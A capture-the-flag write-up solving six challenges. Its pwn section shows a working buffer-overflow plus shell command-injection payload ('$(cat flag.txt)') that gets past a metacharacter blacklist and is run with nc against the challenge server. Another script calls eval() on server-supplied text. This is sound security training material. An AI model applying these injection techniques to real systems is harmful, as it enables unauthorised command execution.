## C4n_I_h4z_c0d3_n_crypt0 - Category: Misc

This was a web/programming based challenge where you were given some maths and you needed to return the answer.

Taking a gamble that the creators weren't going to mess with me I decided to take the simplest path. `eval()`
and well that worked.
I couldn't be bothered dealing with the `base64` inline so I did it manually and ran my solution again with the fix.
>note: don't forget requests.Session()

```python
import requests

url = 'http://docker.hackthebox.eu:30307/flag'
g = requests.Session()
x = g.post(url).text.split("<br>")

problem=format(eval(x[2]),'.2f')

while u'Problem:' in x[1]:
    data = {'answer': problem}
    x = g.post(url, data=data).text.split("<br>")
    if u'Problem:' in x[1]:
        problem = format(eval(x[1][8:]),'.2f')
    else:
        data = {'answer': 'YES_I_CAN!'}
        flag = g.post(url, data=data).text
        print (flag)
```

```shell
bread@sticks:~#python3 solve.py
TMHC{}
```
and we have the flag:

    `TMHC{}`   

## DESk - Category: Misc

- Looked at the image noticed it was a chess move.
- Recently I knew of a weird chess/Linux related thing where Ken Thompsons password was cracked
- Googled for that, found his password `p/q2-q4!`
- Looked at the supplied image to see that the pawn in front of the king is moving from 2-4 
- Extrapolating that to mean this password is `p/k2-k4!`
- Unzip using the password and get the flag


    `TMHC{1_kn0w_d35cr1pt1v3_n0t4t10n}`   


## Beeeep_Beeeep - Category: Misc

- Listened to the audio and recognised it as a video from SmarterEveryDay
- Found the specific video [Oscilloscope Music - (Drawing with Sound) - Smarter Every Day 224](https://www.youtube.com/watch?v=4gibcRfp4zA)
- Looked for an Oscilloscope tool and found [asdfg.me/osci/](http://asdfg.me/osci/)
- Opened the file and we have the flag being played in pieces


    `TMHC{0f5ee61ef3fbb4bb066df8c286ec84b07a7a5d95}`
    
    
## overdosed - Category: PWN

Opened in ghidra, looked at `main()`

```c
undefined8 main(undefined4 param_1,undefined8 param_2){
  undefined *__command;
  size_t sVar1;
  ulong uVar2;
  undefined8 auStack176 [2];
  undefined4 local_9c;
  char local_98 [72];
  undefined *local_50;
  long local_48;
  int local_3c;
  
  auStack176[0] = 0x1013bf;
  auStack176[1] = param_2;
  local_9c = param_1;
  first_chall();
  auStack176[0] = 0x1013cb;
  puts("Hey, I am from TMHC. Could you tell me your name?");
  auStack176[0] = 0x1013dc;
  printf("Name: ");
  auStack176[0] = 0x1013eb;
  fflush(stdout);
  auStack176[0] = 0x101409;
  read(1,local_98,0x40);
  auStack176[0] = 0x101418;
  sVar1 = strlen(local_98);
  local_3c = (int)sVar1;
  auStack176[0] = 0x101434;
  uVar2 = name_check((long)local_98,local_3c,0);
  if ((int)uVar2 == 0) {
    local_48 = (long)(local_3c + 0x12) + -1;
    uVar2 = ((long)(local_3c + 0x12) + 0xfU) / 0x10;
    local_50 = (undefined *)(auStack176[1] + uVar2 * 0x1ffffffffffffffe);
    auStack176[uVar2 * 0x1ffffffffffffffe] = 0x1014be;
    sprintf((char *)(auStack176[1] + uVar2 * 0x1ffffffffffffffe),"/bin/echo Hello \"%s\"",local_98,
            local_98);
    __command = local_50;
    auStack176[uVar2 * 0x1ffffffffffffffe] = 0x1014ca;
    system(__command,*(undefined *)(auStack176 + uVar2 * 0x1ffffffffffffffe));
  }
  else {
    auStack176[0] = 0x1014db;
    puts("Illegal name!");
  }
  return 0;
}
```

From here we can see a couple of things:
 - ```first_chall()```
 - ```local_98``` is the name variable, ```local_3c``` is length and they are used in the ```name_check``` function.
 - If that function returns a `0`, then our name variable is used in the string `"/bin/echo Hello \"%s\""` which is an argument to `system()`.

This means we can probably command inject, but first we need to see what `first_chall` and `name_check` do.

```c
void first_chall(void){
  size_t sVar1;
  ulong uVar2;
  char local_a8 [32];
  char local_88 [32];
  char local_68 [64];
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  FILE *local_10;
  
  local_28 = 0x7869704851;
  local_20 = 0;
  local_18 = 0;
  puts("Could you tell me about yourself?");
  fflush(stdout);
  gets(local_68);
  sVar1 = strlen((char *)&local_28);
  uVar2 = name_check((long)&local_28,(int)sVar1,1);
  if ((int)uVar2 == 0) {
    sprintf(local_a8,"/bin/echo \"%s\"",&local_28);
    local_10 = popen(local_a8,"r");
    fgets(local_88,0x1e,local_10);
    setenv("name",local_88,1);
  }
  else {
    puts("Too bad!!");
  }
  return;
}
```
Ok lets read the code:
- We can see that an environment variable (`name`) is set to the value found in `local_88` 
    - Which can only be `30` char long.
    - Which is the output of `popen()`
- `popen()` is constructed with `"/bin/echo \"%s\""` and `local_28`
    - `local_28 == 0x7869704851` or `QHpix`
- For no apparent reason a `gets(local_68)` call exists
    - `local_68` is not used after this point.
    - `local_68 [64]`, length is 64.
    - `gets()` is a known vulnerable function, used in BOF attacks

This means we have a BOF, and with it (depending on the stack layout) we can control the environment variable (`name`).

Lets take a look at `name_check` now because both the CI and BOF rely on it returning `0`:

```c
ulong name_check(long param_1,int param_2,int param_3){
  char cVar1;
  uint local_10;
  int local_c;
  
  local_10 = 0;
  local_c = 0;
  while (local_c < param_2) {
    cVar1 = *(char *)(param_1 + local_c);
    if (cVar1 == '/') {
      if (param_3 == 0) {
        local_10 = 0xffffffff;
      }
    }
    else {
      if (cVar1 < '0') {
        if (cVar1 == '&') {
          local_10 = 0xffffffff;
        }
        else {
          if (cVar1 == '(') {
            if (param_3 == 0) {
              local_10 = 0xffffffff;
            }
          }
          else {
            if ((cVar1 == '\"') && (param_3 == 0)) {
              local_10 = 0xffffffff;
            }
          }
        }
      }
      else {
        if (cVar1 == '`') {
          local_10 = 0xffffffff;
        }
        else {
          if (cVar1 == '|') {
            local_10 = 0xffffffff;
          }
          else {
            if ((cVar1 == ';') && (param_3 == 0)) {
              local_10 = 0xffffffff;
            }
          }
        }
      }
    }
    local_c += 1;
  }
  return (ulong)local_10;
}
```

This is simple enough its a blacklist function, that triggers on any occurrences of these characters ```['/', '&', '(', '\"', '`', '|', ';']```.

A couple of interesting things to note:
- There is no `$` blacklisting.
- There is a bypass flag `param_3`.
    - The call from `first_chall` is set to `1` allowing a bypass.
    - The call from `main` is set to `0`, so we have a restricted CI there.

### Lets put this all together then
- We use the BOF to set `name` env to a command of our choice.
    - `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo "bread")`
- We then call `name` using `$name`

```shell
bread@sticks:~# ./overdosed 
Could you tell me about yourself?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo "bread")
Hey, I am from TMHC. Could you tell me your name?
Name: $name
Hello bread
```

yep that works, guess the stack is set up how I expected. lets try it on the server.

```shell
bread@sticks:~# nc docker.hackthebox.eu 1337
Could you tell me about yourself?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(cat flag.txt)
Hey, I am from TMHC. Could you tell me your name?
Name: $name
Hello TMHC{}
```

Got the flag

    `TMHC{}`

## Operation - Category: RE

Opened in ghidra read `main()`
```c
undefined8 main(int argc,undefined8 *argv){
  int iVar1;
  char local_28 [32];
  
  if (argc < 2) {
    printf("Usage: %s <file>\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (2 < argc) {
    iVar1 = strncmp("--debug",(char *)argv[2],7);
    if (iVar1 == 0) {
      isDebug = 1;
      printf("operations is at: %p\n",operations);
    }
  }
  readFlag(local_28,(char *)argv[1]);
  operations((long)local_28,0);
  puts(local_28);
  return 0;
}
```
Which as you can see at the bottom 2 functions are called firstly `readFlag()` then `operations()`.
If we quickly look at `operations()` if `param_2` does not equal `0` then the operations are not applied.

```c
void operations(long param_1,int param_2){
  int local_c;
  
  if (param_2 != 0) {
    local_c = 0;
    while (local_c < 5) {
      *(byte *)(param_1 + local_c) = *(byte *)(param_1 + local_c) ^ 0x23;
      local_c += 1;
    }
    local_c = 5;
    while (local_c < 0xf) {
      *(byte *)(param_1 + local_c) = *(byte *)(param_1 + local_c) ^ 0x19;
      local_c += 1;
    }
    local_c = 0xf;
    while (local_c < 0x19) {
      *(byte *)(param_1 + local_c) = *(byte *)(param_1 + local_c) ^ 1;
      local_c += 1;
    }
  }
  return;
}
```

At this point you can patch the call to `operations()`, setting `param_2` to any int other than `0` and it will do the operations for you.
However a quick read of the code and we can see its just some `XOR` operations.

Easy enough to do ourselves, copy the content from `flag.txt`, put in `cyberchef` and use the `XOR` function.
Set the first `5 chars` of the key to `0x23`, next 5 `0x19`,and then the remaining to `0x01`

``` 
XOR KEY
23232323231919191919191919191901010101010101010101
```

got the flag:

    `TMHC{b1tWi5e_0pEr4tiOns}`
    
## DeNuevo - Category: RE

Opened in ghidra read `entry()` which calls `FUN_00401073(1)`.

If we have a look at that code, we see a loop using an `XOR` operation,  on the `local_res0` variable.
```c
void FUN_00401073(UINT param_1)

{
  code *pcVar1;
  int iVar2;
  byte *pbVar3;
  byte *local_res0;
  
  iVar2 = 0x69;
  pbVar3 = local_res0;
  do {
    *pbVar3 = *pbVar3 ^ 0xab;
    pbVar3 = pbVar3 + 1;
    iVar2 += -1;
  } while (iVar2 != 0);
  WinExec((LPCSTR)local_res0,param_1);
  ExitProcess(0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}
```

We don't currently know what `local_res0` is but we do know what onces the `XOR` loop is completed its used by `WinExec()`. 

> Runs the specified application.
```
UINT WinExec(
  LPCSTR lpCmdLine,
  UINT   uCmdShow
);
```
[WinExec function](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)

OK lets open it now with `x32dbg` and set a breakpoint at the called to `WinExec()` (`003B1081`), and run.
looks like the argument to `WinExec()` are:
```
1: [esp] 003B100B "C:\\Python27\\python.exe -c \"import zlib;exec(zlib.decompress(open('.\\denuevo.exe','rb').read()[9216:]))\""
2: [esp+4] 00000001 
```
change that up a little so its written to a file rather than `exec`.
```python 
import zlib
with open('extracted_file.py', 'w') as f:
	f.write(zlib.decompress(open('denuevo.exe','rb').read()[9216:]))
```
and we have (minus the snake game):
```python 
x = list(raw_input("Enter your serial key: "))
for i in ['j','7','b','g','5','6','2']:
	if x.pop() != i: exit()
i = int(i)
while i != 9:
	if x.pop() != ['j','x','d','y','z','3','5'][i]: exit()
	i += -4 if i + 3 > 6 and i != 6 else 3
print "Your serial key has activated the videogame! Submit the challenge with TMHC{serial}"
...
```

Final part is to use the loops to undo themselves.
```python
# reverse the array
serial = ['j','7','b','g','5','6','2'][::-1]
x = serial.copy()
for i in ['j','7','b','g','5','6','2']:
    if x.pop() != i: exit()
i = int(i)
while i != 9:
    # insert at the start
    serial.insert(0,['j','x','d','y','z','3','5'][i])
    i += -4 if i + 3 > 6 and i != 6 else 3
print (f"TMHC{'{'+''.join(serial)+'}'}")
```

and we get the flag:
```shell
bread@sticks:~# python solve.py
TMHC{5yjzx3d265gb7j}
```

    `TMHC{5yjzx3d265gb7j}`
